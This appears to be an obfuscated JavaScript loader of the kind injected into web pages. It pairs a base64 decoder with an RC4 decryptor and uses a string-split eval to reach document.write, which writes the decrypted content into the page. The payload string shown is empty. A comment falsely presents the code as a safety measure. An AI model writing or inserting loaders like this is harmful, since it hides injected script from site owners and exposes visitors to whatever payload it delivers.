    var ivvLoP = {

_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",


	SglWSJ : function (input) {
		 var output = "";
		 var chr1, chr2, chr3;
		 var enc1, enc2, enc3, enc4;
		 var i = 0;

		 input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

		 while (i < input.length) {

			 enc1 = this._keyStr.indexOf(input.charAt(i++));
			 enc2 = this._keyStr.indexOf(input.charAt(i++));
			 enc3 = this._keyStr.indexOf(input.charAt(i++));
			 enc4 = this._keyStr.indexOf(input.charAt(i++));

			 chr1 = (enc1 << 2) | (enc2 >> 4);
			 chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
			 chr3 = ((enc3 & 3) << 6) | enc4;

			 output = output + String.fromCharCode(chr1);

			 if (enc3 != 64) {
				 output = output + String.fromCharCode(chr2);
			 }
			 if (enc4 != 64) {
				 output = output + String.fromCharCode(chr3);
			 }

		 }

		 //output = ivvLoP._utf8_decode(output);

		 return output;

	 }
}

var fPLZOj = (function(fromCharCode, random){
		return {

rJBDmf:function(key, data){
for(var
	length = key.length, len = data.length,
	decode = [], a = [],
	i = 0, j = 0, k = 0, l = 0, x;
	i < 256; ++i
   )   a[i] = i;
for(i = 0; i < 256; ++i){
	j = (j + a[i] + key.charCodeAt(i % length)) % 256;
	x = a[i];
	a[i] = a[j];
	a[j] = x;
};
i = 0; j = 0;
for(k = 0; k < len; ++k){
	i = (i+1) % 256;
	j = (j + a[i]) % 256;
	x = a[i];
	a[i] = a[j];
	a[j] = x;
	decode[k] = fromCharCode(data.charCodeAt(k) ^ a[(a[i] + a[j]) % 256]);
};
return decode.join("");
}
}
// I like to freeze stuff in interpretation time
// it makes things a bit safer when obtrusive libraries
// are around
})(window.String.fromCharCode, window.Math.random);

var IuXLNX = eval('docu'+'men'+'t');

IuXLNX.write(fPLZOj.rJBDmf('wnJvaySi', ivvLoP.SglWSJ('')));    
